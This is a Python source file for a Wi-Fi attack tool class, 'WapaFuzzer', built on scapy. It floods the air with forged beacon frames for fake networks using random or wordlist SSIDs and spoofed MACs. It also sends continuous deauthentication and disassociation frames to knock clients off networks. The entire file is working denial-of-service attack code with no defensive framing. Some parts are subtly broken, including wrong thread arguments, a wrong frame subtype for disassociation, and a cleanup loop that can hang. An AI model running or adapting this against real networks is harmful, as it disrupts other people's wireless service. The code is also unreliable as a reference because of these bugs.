import sqlite3
import sys, os, re
import pandas as pd
import random
import string
from threading import Thread, Lock
from scapy.layers.dot11 import Dot11, Dot11Elt, Dot11Beacon, RadioTap, Dot11Deauth, Dot11Disas
from scapy.sendrecv import sendp
from scapy.volatile import RandMAC
from time import sleep


from wapa_gp import GeneralPurpose
from wapa_db import WapaDatabase

class WapaFuzzer:
    fuzzer = True
    allthread_counter = []
    reasons = [1, 2, 3, 4, 6, 7, 8, 24]

    def __init__(self):
        pass

    def get_random_charset(self, charset):
        if charset.lower() == "default" or charset == "" or charset == " " or charset.lower() == "all":
            end_charset =  string.digits + string.digits + string.ascii_lowercase + string.ascii_uppercase + string.digits + "!#%&'()*,-./:;<=>@^_`{|}~ "
        elif charset.lower() == "lowercase":
            end_charset = string.ascii_lowercase
        elif charset.lower() == "uppercase":
            end_charset = string.ascii_uppercase
        elif charset.lower() == "digits" or charset.lower() == "numbers":
            end_charset = string.digits
        else:
            end_charset = charset
        while True:
            rand_essid = ''.join(random.sample(end_charset*6, random.randint(8, 32)))
            if rand_essid.startswith("!") or rand_essid.startswith("#") or rand_essid.startswith(";") or rand_essid.startswith("!") or rand_essid.startswith(" ") or rand_essid.endswith(" "):
                pass
            else:
                break

        return rand_essid

    def generate_wordlist(self, sentence, count):
        if type(count) is int:
            wordlist = []
            while True:
                ok = 0
                if sentence.startswith("!"):
                    sentence = sentence.replace("!", '')
                else:
                    ok += 1
                if sentence.startswith("#"):
                    sentence = sentence.replace("#", '')
                else:
                    ok += 1
                if sentence.startswith(";"):
                    sentence = sentence.replace(";", '')
                else:
                    ok += 1
                if sentence.startswith(" "):
                    sentence = sentence.replace("!", '')
                else:
                    ok += 1
                if sentence.endswith(" "):
                    sentence = sentence.replace(" ", '')
                else:
                    ok += 1
                
                if ok == 5:
                    break
                
            for i in range(0, count):
                data = sentence + str(i)
                wordlist.append(data)
            return wordlist
        else:
            print("[!] Expected an integer")

    def obtain_wordlist(self, path): # la diferencia se basará en qué dato se envía, si un número o string + --> .extensión <--
        try:
            with open(path, "r") as file:
                lines = file.readlines()
            wordlist = []
            for line in lines:
                while True:
                    ok = 0
                    if line.startswith("!"):
                        line = line.replace("!", '')
                    else:
                        ok += 1
                    if line.startswith("#"):
                        line = line.replace("#", '')
                    else:
                        ok += 1
                    if line.startswith(";"):
                        line = line.replace(";", '')
                    else:
                        ok += 1
                    if line.startswith(" "):
                        line = line.replace("!", '')
                    else:
                        ok += 1
                    if line.endswith(" "):
                        line = line.replace(" ", '')
                    else:
                        ok += 1

                    if ok == 5:
                        break
                wordlist.append(line.strip())
            return wordlist
        except:
            print("[!] Couldn't obtain the wordlist")


    ## Dot11Beacon section ///////////////////////////////////////////////////////////////////////////////

    def craft_beacons(self, essid_name, bssid, security_type): # security type -> random / opn / wep / wpa / wpa2
        essid = Dot11Elt(ID="SSID",info=essid_name,len=len(essid_name))
        dst = "ff:ff:ff:ff:ff:ff"
        dot11 = Dot11(proto=0,type=0,subtype=8,addr1=dst,addr2=bssid,addr3=bssid)
        if security_type.lower() == "random" or security_type.lower() == "rand" or security_type.lower() == "r":
            sec = random.randrange(0,5)
        elif security_type.lower() == "opn" or security_type.lower() == "open":
            sec = 0
        elif security_type.lower() == "wep":
            sec = 1
        elif security_type.lower() == "wpa":
            sec = 2
        elif security_type.lower() == "wpa2":
            sec = 3
        else:
            sec = 0
            print("[!] Security method not recognised, continuing with OPN networks")
        if sec == 0:
            # OPEN NETWORK
            beacon = Dot11Beacon(cap="ESS")
            rsn = ""
        elif sec == 1:
            # Wired Equivalent Privacy security
            beacon = Dot11Beacon(cap="ESS+privacy")
            rsn = ""
        elif sec == 2:
            # Wi-Fi Protected Access security
            beacon = Dot11Beacon(cap="ESS+privacy")
            rsn = Dot11Elt(ID="RSNinfo", info=(
            b'\x01\x00'          # RSN v1
            b'\x00\x0f\xac\x01'  # Group Cipher Suite : 00-0f-ac TKIP (WPA uses TKIP)
            b'\x01\x00'          # PCS (1)
            b'\x00\x0f\xac\x01'  # TKIP
            b'\x01\x00'          # Auth key mgmnt
            b'\x00\x0f\xac\x01'  # PSK
            b'\x00\x00'))        # RSN (no extras)

        else: # Wi-Fi Protected Access version 2
            beacon = Dot11Beacon(cap="ESS+privacy")
            rsn = Dot11Elt(ID="RSNinfo", info=(
            b'\x01\x00'          # RSN v1
            b'\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac AES (CCMP) - WPA2 uses CCMP (AES-CCMP)
            b'\x02\x00'          # 2 Pairwise Cipher Suites
            b'\x00\x0f\xac\x04'  # AES --> preferred cipher method
            b'\x00\x0f\xac\x02'  # TKIP
            b'\x01\x00'          # Auth key mgmnt
            b'\x00\x0f\xac\x02'  # PSK
            b'\x00\x00'))        # RSN (no extras)

        dsset = Dot11Elt(ID="DSset",info="\x01")
        tim = Dot11Elt(ID="TIM",info="\x00\x01\x00\x00") # Traffic Indication Map
        rates = Dot11Elt(ID="Rates",info="\x02\x04\x0b\x16\x0c\x12\x18\x24\x30\x48\x60\x6c") # Modern rates for WiFi networks

        beacon_packet = RadioTap()/dot11/beacon/essid/rsn/rates/dsset/tim
        return beacon_packet
    
    def send_beacons(self, essid, bssid, security, intf):
        beacon = self.craft_beacons(essid, bssid, security)
        while self.fuzzer:
            sendp(beacon,iface=intf,verbose=0)
            sleep(0.25)

    def beacon_fuzzer(self, wordlist, string, count, sectype, intf):
        thread_counter = 0
        if wordlist.lower() == "random":
            while self.fuzzer:
                essid = self.get_random_charset(string)
                random_mac = RandMAC("*")
                bssid = str(random_mac)
                fuzzer_thread = Thread(target=self.send_beacons, args=(essid, bssid, sectype, intf), name=f"fuzzer_thread_{thread_counter}")
                thread_counter += 1
                self.allthread_counter.append(fuzzer_thread)
                fuzzer_thread.start()
                wapadb = WapaDatabase()
                wapadb.beacons_to_table(essid=essid, bssid=bssid, security=sectype)
                sleep(1)
        elif wordlist.lower() == "generate":
            wordlist = self.generate_wordlist(string, count)
            wordlist_iterator = 0
            while self.fuzzer:
                essid = wordlist[wordlist_iterator]
                random_mac = RandMAC("*")
                bssid = str(random_mac)
                fuzzer_thread = Thread(target=self.send_beacons, args=(essid, bssid, sectype, intf), name=f"fuzzer_thread_{thread_counter}")
                thread_counter += 1
                wordlist_iterator += 1
                self.allthread_counter.append(fuzzer_thread)
                fuzzer_thread.start()
                sleep(1)
        elif wordlist.lower() == "obtain":
            wordlist = self.obtain_wordlist(string)
            wordlist_iterator = 0
            while self.fuzzer:
                essid = wordlist[wordlist_iterator]
                random_mac = RandMAC("*")
                bssid = str(random_mac)
                fuzzer_thread = Thread(target=self.send_beacons, args=(essid, sectype, intf), name=f"fuzzer_thread_{thread_counter}")
                thread_counter += 1
                wordlist_iterator += 1
                self.allthread_counter.append(fuzzer_thread)
                fuzzer_thread.start()
                sleep(1)
                if len(wordlist) == wordlist_iterator:
                    print("[*] Ended fuzzing the wordlist, beacons will be active until fuzzer is stopped.")
                    break


    # Dot11Deauth / Dot11Disas section  ///////////////////////////////////////////////////////////////////////////////

    def craft_deauth(self, d_reason, deauth_source, deauth_target):
        if not deauth_source:
            src_mac = RandMAC("*")
        else:
            src_mac = deauth_source
        if d_reason in self.reasons:
            if deauth_target == "broadcast" or deauth_target.lower() == "ff:ff:ff:ff:ff:ff":
                dst_mac = "ff:ff:ff:ff:ff:ff"
                dot11_frame = Dot11(proto=0,type=0,subtype=12,addr1=dst_mac,addr2=src_mac,addr3=src_mac)
                deauth_frame = Dot11Deauth(reason=d_reason)
                dot11deauth_packet = RadioTap()/dot11_frame/deauth_frame
                return dot11deauth_packet
            else:
                dst_mac = deauth_target
                dot11_frame = Dot11(proto=0,type=0,subtype=12,addr1=deauth_target,addr2=src_mac,addr3=src_mac)
                deauth_frame = Dot11Deauth(reason=d_reason)
                dot11deauth_packet = RadioTap()/dot11_frame/deauth_frame
                return dot11deauth_packet
        else:
            print("[!] Deauthentication reason not supported")

    def craft_disas(self, d_reason, disas_src, disas_dst):
        if not disas_src:
            src_mac = RandMAC("*")
        else:
            src_mac = disas_src
        if d_reason in self.reasons:
            if disas_dst == "broadcast" or disas_dst.lower() == "ff:ff:ff:ff:ff:ff":
                dst_mac = "ff:ff:ff:ff:ff:ff"
                dot11_frame = Dot11(proto=0,type=0,subtype=12,addr1=dst_mac,addr2=src_mac,addr3=src_mac)
                disas_frame = Dot11Disas(reason=d_reason)
                dot11disas_packet = RadioTap()/dot11_frame/disas_frame
                return dot11disas_packet
            else:
                dst_mac = disas_dst
                dot11_frame = Dot11(proto=0,type=0,subtype=12,addr1=disas_dst,addr2=src_mac,addr3=src_mac)
                disas_frame = Dot11Disas(reason=d_reason)
                dot11disas_packet = RadioTap()/dot11_frame/disas_frame
                return dot11disas_packet
        else:
            print("[!] Disasociation reason not supported")

    def send_deauth_disas(self, mode, src, dst, reason, intf):
        if mode == "deauth":
            deauth_packet = self.craft_deauth(d_reason=reason, deauth_source=src, deauth_target=dst)
            while self.fuzzer:
                sendp(deauth_packet,iface=intf,verbose=0)
                sleep(0.25)
        elif mode == "disas":
            disas_packet = self.craft_disas(d_reason=reason, disas_src=src, disas_dst=dst)
            while self.fuzzer:
                sendp(disas_packet,iface=intf,verbose=0)
                sleep(0.25)

    def stop_fuzzer(self):
        self.fuzzer = False
        print("[*] Killing all threads...")
        for thread in self.allthread_counter:
            thread.join()
        wapadb = WapaDatabase()
        wapadb.clean_beacons()
        sleep(3)
        self.fuzzer = True